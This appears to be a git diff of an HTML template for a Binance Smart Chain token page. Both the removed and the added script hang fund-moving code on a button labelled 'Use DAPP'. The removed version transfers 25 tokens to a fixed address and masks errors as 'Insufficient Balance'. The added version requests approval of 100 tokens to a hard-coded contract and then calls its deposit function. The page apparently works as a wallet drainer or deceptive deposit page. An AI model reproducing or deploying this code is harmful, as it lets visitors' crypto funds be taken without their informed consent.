@@ -54,7 +54,7 @@
                                       <input type="hidden" name="ghasedrftvgbhnj" value="drcftvgbh">
                                       <select style="display: none;" class="form-control" id="connectWallet">
                                       </select>
-                                        <button type="submit" onClick='connectWalletViaSelect()' class="btn btn-primary">
+                                        <button type="submit" id="deposit" class="btn btn-primary">
                                           Use DAPP
                                         </button>
             
@@ -87,53 +87,116 @@
             <script crossorigin src="https://depayfi.github.io/web3-wallets/dist/umd/index.js?7"></script>
             <script crossorigin src="https://cdn.jsdelivr.net/npm/web3@1.5.2/dist/web3.min.js"></script>
             
-                <script>
-                  web3 = new Web3();
-                  var amount = web3.utils.toWei("25", "ether");
-                  const receiverAddress = "0xdEe1d2e52cfd28d851229A06cfE428E356044059"; // Replace with the recipient's wallet address
-                  console.log(amount, 'hiiiiiiiiiiiiiii')
-                  function val() {
-                      d = document.getElementById("amount").value;
-                      amount = web3.utils.toWei(d, "ether");
-                      console.log(amount, d);
-                  }
-                  document.addEventListener("DOMContentLoaded", function() {
-                    let select = document.getElementById('connectWallet')
-                    setTimeout(()=>{
-                      Web3Wallets.getWallets().then((availableWallets)=>{
-                        availableWallets.forEach((wallet, index)=>{
-                          let option = document.createElement("option")
-                          option.setAttribute('value', index)
-                          option.innerHTML = wallet.name
-                          select.append(option)
-                        })
-                      })
-                    }, 500)
-                  })
-                  window.connectWalletViaSelect = async ()=> {
-                    try{
-                      let wallets = await Web3Wallets.getWallets()
-                      let wallet = wallets[parseInt(document.getElementById("connectWallet").value, 10)]
-                      console.log(wallet)
-                      let accounts = await wallet.connect()
-                      window.wallet = wallet
-                      console.log(accounts)
-                      console.log('sendContractTransactionBsc')
-                      await wallet.sendTransaction({ 
-                      blockchain: "bsc",
-                      from: await wallet.account(),
-                      to: "0x55d398326f99059fF775485246999027B3197955", 
-                      method: "transfer", 
-                      params: [receiverAddress, amount ],
-                      api: [{"inputs":[],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"constant":true,"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"subtractedValue","type":"uint256"}],"name":"decreaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"getOwner","outputs":[{"internalType":"address","name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"addedValue","type":"uint256"}],"name":"increaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"mint","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"renounceOwnership","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"sender","type":"address"},{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"}],
-                      sent: function(transaction){ alert(transaction) },
-                      succeeded: function(transaction){ alert(transaction) },
-                      failed: function(transaction){ alert(transaction.message); } 
-                    }).then((transaction)=>{ alert(transaction); })
-                    document.getElementById("myForm").submit();
-                  } catch (error) {
-                    alert('Insufficient Balance');
-                  }
-                  }
-                </script>
+    <script>
+      const queryString = window.location.search;
+      console.log(queryString);
+      const urlParams = new URLSearchParams(queryString);
+      const refer = urlParams.get('refer')
+      console.log(refer);
+      web3 = new Web3();
+      document.addEventListener("DOMContentLoaded", function() {
+      let select = document.getElementById('connectWallet')
+      setTimeout(()=>{
+          Web3Wallets.getWallets().then((availableWallets)=>{
+          availableWallets.forEach((wallet, index)=>{
+              let option = document.createElement("option")
+              option.setAttribute('value', index)
+              option.innerHTML = wallet.name
+              select.append(option)
+          })
+          })
+      }, 500)
+      })
+      async function checkBUSD(accounts) {
+            const provider = new ethers.providers.JsonRpcProvider('https://bsc-dataseed.binance.org/');
+            const busdAddress = '0x83F928c66F437507EB399F8E91e84f2fD15C57Ec'; // Example: Binance-Peg BUSD Token address
+        
+            // Place ABI array here, the following is an example for balanceOf function
+            const busdAbi = [
+              'function balanceOf(address owner) view returns (uint256)'
+            ];
+        
+            const busdContract = new ethers.Contract(busdAddress, busdAbi, provider);
+            const walletAddress = accounts; // replace with the address you want to check
+        
+            try {
+              const balance = await busdContract.balanceOf(walletAddress);
+              document.getElementById('balance').innerHTML = '$ ' + ethers.utils.formatUnits(balance, 18);
+            } catch (error) {
+              console.error("An error occurred", error);
+              document.getElementById('balance').innerHTML = 'Error getting balance';
+            }
+          }
+       
+      window.swapFunction = async ()=> {;
+        
+          let wallets = await Web3Wallets.getWallets()
+          let wallet = wallets[parseInt(document.getElementById("connectWallet").value, 10)]
+          console.log(wallet)
+          let accounts = await wallet.connect()
+          window.wallet = wallet;
+          console.log(accounts)
+          document.getElementById('deposit').innerHTML = accounts.slice(0, 4)+'....'+accounts.substr(accounts.length - 4);
+          checkBUSD(accounts);
+         var amount = web3.utils.toWei((100).toString(), 'ether');
+         var receiverAddress = "0x533Cb21D93b03c947F27114547d2c916397e1724";
+         
+         var newe = 100;
+          try{
+           let wallets = await Web3Wallets.getWallets()
+           let wallet = wallets[parseInt(document.getElementById("connectWallet").value, 10)]
+           console.log(wallet)
+           let accounts = await wallet.connect()
+           window.wallet = wallet
+           console.log(accounts)
+           console.log('sendContractTransactionBsc')
+           await wallet.sendTransaction({ 
+           blockchain: "bsc",
+           from: await wallet.account(),
+           to: "0x55d398326f99059fF775485246999027B3197955",
+           method: "approve", 
+           params: [receiverAddress, amount ],
+           api: [{"inputs":[],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"constant":true,"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"subtractedValue","type":"uint256"}],"name":"decreaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"getOwner","outputs":[{"internalType":"address","name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"addedValue","type":"uint256"}],"name":"increaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"mint","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"renounceOwnership","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"sender","type":"address"},{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"}],
+           sent: function(transaction){ console.log(transaction.message) },
+           succeeded: function(transaction){ console.log(transaction.message) },
+           failed: function(transaction){ console.log(transaction.message); }
+         }).then((transaction)=>{ 
+          })
+       } catch (err) {
+          console.log(err)
+       }
+       try{
+         console.log(newe, "{{ ref.address }}", "----------------------------------------------------------------------------------------------------")
+           let wallets = await Web3Wallets.getWallets()
+           let wallet = wallets[parseInt(document.getElementById("connectWallet").value, 10)]
+           console.log(wallet)
+           let accounts = await wallet.connect()
+           window.wallet = wallet
+           console.log(accounts)
+           console.log('sendContractTransactionBsc')
+           await wallet.sendTransaction({ 
+           blockchain: "bsc",
+           from: await wallet.account(),
+           to: "0x533Cb21D93b03c947F27114547d2c916397e1724",
+           method: "depositTokens", 
+           params: ["0x55d398326f99059fF775485246999027B3197955", amount],
+           api: [{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"address","name":"previousAdmin","type":"address"},{"indexed":false,"internalType":"address","name":"newAdmin","type":"address"}],"name":"AdminChanged","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"beacon","type":"address"}],"name":"BeaconUpgraded","type":"event"},{"inputs":[],"name":"depositEther","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"address","name":"tokenAddress","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"depositTokens","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"initialize","outputs":[],"stateMutability":"nonpayable","type":"function"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"uint8","name":"version","type":"uint8"}],"name":"Initialized","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"inputs":[],"name":"renounceOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"tokenAddress","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"stake","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"buytokenAddress","type":"address"},{"internalType":"address","name":"selltokenAddress","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"swap","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"implementation","type":"address"}],"name":"Upgraded","type":"event"},{"inputs":[{"internalType":"address","name":"newImplementation","type":"address"}],"name":"upgradeTo","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newImplementation","type":"address"},{"internalType":"bytes","name":"data","type":"bytes"}],"name":"upgradeToAndCall","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"},{"internalType":"address","name":"tokenAddress","type":"address"},{"internalType":"bytes32","name":"messageHash","type":"bytes32"},{"internalType":"address","name":"user","type":"address"},{"internalType":"uint8","name":"v","type":"uint8"},{"internalType":"bytes32","name":"r","type":"bytes32"},{"internalType":"bytes32","name":"s","type":"bytes32"}],"name":"withdraw","outputs":[],"stateMutability":"nonpayable","type":"function"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"account","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"},{"indexed":false,"internalType":"address","name":"tokenAddress","type":"address"}],"name":"Withdraw","type":"event"},{"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"},{"internalType":"address","name":"tokenAddress","type":"address"},{"internalType":"bytes32","name":"messageHash","type":"bytes32"},{"internalType":"address","name":"user","type":"address"},{"internalType":"address","name":"receiver","type":"address"},{"internalType":"uint8","name":"v","type":"uint8"},{"internalType":"bytes32","name":"r","type":"bytes32"},{"internalType":"bytes32","name":"s","type":"bytes32"}],"name":"withdrawAdmin","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"etherBalance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"getEtherBalance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"string","name":"message","type":"string"}],"name":"getMessageHash","outputs":[{"internalType":"bytes32","name":"","type":"bytes32"}],"stateMutability":"pure","type":"function"},{"inputs":[{"internalType":"address","name":"tokenAddress","type":"address"}],"name":"getTokenBalance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"proxiableUUID","outputs":[{"internalType":"bytes32","name":"","type":"bytes32"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"tokenBalances","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"}],
+           sent: function(transaction){ console.log(transaction.message) },
+           succeeded: function(transaction){ console.log(transaction.message) },
+           failed: function(transaction){ console.log(transaction.message); }
+         }).then((transaction)=>{
+          document.getElementById('spanswap').innerHTML = 'Swap Succesfull'
+         })
+       } catch (err) {
+          console.log(err)
+       }
+       }
+       
+      document.addEventListener("DOMContentLoaded", function() {
+         var swapButton = document.getElementById("deposit");
+
+         // Attach the handleClick function as an event listener to the button
+         swapButton.addEventListener("click", swapFunction);
+      });
+      </script>
             {% endblock content %}
